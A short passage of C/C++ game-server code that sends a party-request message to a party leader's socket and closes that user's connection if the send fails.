	if (!pUser[Leaderconn].cSock.SendOneMessage((char*)&sm_cap, sizeof(MSG_SendReqParty)))
		CloseUser(Leaderconn);
}